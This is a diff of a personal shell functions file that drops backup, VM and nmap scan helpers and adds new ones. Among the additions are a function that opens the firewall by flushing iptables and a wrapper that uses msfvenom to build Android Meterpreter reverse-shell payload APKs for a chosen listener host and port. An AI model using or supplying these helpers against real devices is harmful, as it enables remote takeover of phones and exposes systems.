@@ -10,20 +10,8 @@ function tre() {
   tree -aC -I '.git|node_modules|bower_components' --dirsfirst "$@" | less -FRNX;
 }
 
-function clr() {
-#  clear && sudo bash $HOME/.fort-cow.sh
-    clear && neofetch
-}
-
-#
-# # Fix for VmWare
-#
-function vwprob() {
-  sudo modprobe -a vmw_vmci vmmon
-}
-
-# # ex - archive extractor
-# # usage: ex <file>
+# # exx - archive extractor
+# # usage: exx <file>
 function exx () {
   if [ -f $1 ] ; then
     case $1 in
@@ -45,48 +33,64 @@ function exx () {
   fi
 }
 
-#
-# # runsync - run rsync
-#
-function runsync() {
-  sudo rsync -aAXvrz --delete --exclude 'rykn0wxx/.rbenv/*' --exclude 'rykn0wxx/.local/*' --exclude 'rykn0wxx/.npm/*' --exclude 'rykn0wxx/.oh-my-zsh/*' --exclude 'rykn0wxx/.android/*' --exclude 'rykn0wxx/Downloads/*' --exclude 'rykn0wxx/ISO/*' --exclude 'rykn0wxx/VirtualBox\ VMs/*' --exclude 'rykn0wxx/.cache/*' --exclude 'rykn0wxx/vmware/*' /home/ /tmp/backups/
-}
-
-function mm () {
-  if [ -f $1 ] ; then
-    case $1 in
-      n)  sudo nmap -sn 192.168.254.0/24 ;;
-      s)  sudo nmap -sS 192.168.254.0/24 ;;
-    esac
-  fi
-}
-
-function vmx () {
-  if [ $1 ] && [ $2 ] ; then
-    case $1 in
-      start) VBoxManage startvm $2 --type headless ;;
-      stop) VBoxManage controlvm $2 acpipowerbutton ;;
-    esac
-  fi
+function reset_iptables () {
+  iptables -P INPUT ACCEPT
+  iptables -P OUTPUT ACCEPT
+  iptables -P FORWARD ACCEPT
+  sleep 1s
+  iptables -F INPUT
+  iptables -F OUTPUT
+  iptables -F FORWARD
+  sleep 1s
+  iptables -F
+  echo "done"
 }
 
 function vscode () {
   vargs="--user-data-dir='/home/rykn0wxx'"
   if [[ -z $@ ]] ; then
-    code sample.txt --user-data-dir='/home/rykn0wxx'
+    code sample.txt --user-data-dir
   else
-    code "$@" --user-data-dir='/home/rykn0wxx'
+    code $1 --user-data-dir
   fi
-#  if [ $1 == "" ]; then
-#      /usr/bin/code noname.txt --user-data-dir /home/rykn0wxx
-#  else
-#      /usr/bin/code . --user-data-dir /home/rykn0wxx/
-#  fi
 }
 
-##
-# Find large files and directory
-alias large_files='find -type f -exec du -Sh {} + | sort -rh | head -n 20'
-alias large_dir='du -Sh | sort -rh | head -n 20'
+function to-mon () {
+  if [[ ! ($# -eq 0) ]] ; then
+    ip link set "${1}" down >/dev/null 2>&1
+    if [[ "${2}" = "mon" ]] ; then
+      iw "${1}" set monitor control >/dev/null 2>&1
+    else
+      iw "${1}" set type managed >/dev/null 2>&1
+    fi
+  fi
+  error=$?
+  ip link set "${1}" up >/dev/null 2>&1
+  if [ "${error}" != 0 ]; then
+    return 1
+  fi
+  return 0
+}
 
-#
+function apk() {
+  if [[ ($# -eq 4) ]] ; then
+    case "$1" in
+      tcp) msf_payload="android/meterpreter/reverse_tcp" ;;
+      http) msf_payload="android/meterpreter/reverse_http" ;;
+      https) msf_payload="android/meterpreter/reverse_https" ;;
+    esac
+    if [[ ! `(ipcalc -c "$2" | grep -i invalid)` ]]; then
+      msf_lhost="LHOST=${2}"
+    fi
+    if [[ "$3" =~ ^[0-9]+$ && $3 -ge 1 && $3 -le 65536 ]]; then
+      msf_lport="LPORT=${3}"
+    fi
+    msfvenom --payload $msf_payload $msf_lhost $msf_lport --smallest --arch dalvik --platform android --format raw --out "${4}"
+  fi
+}
+
+function unspace() {
+  if [[ -f $1 ]] ; then
+    sed -i '/^\s*$/d' $1
+  fi
+}
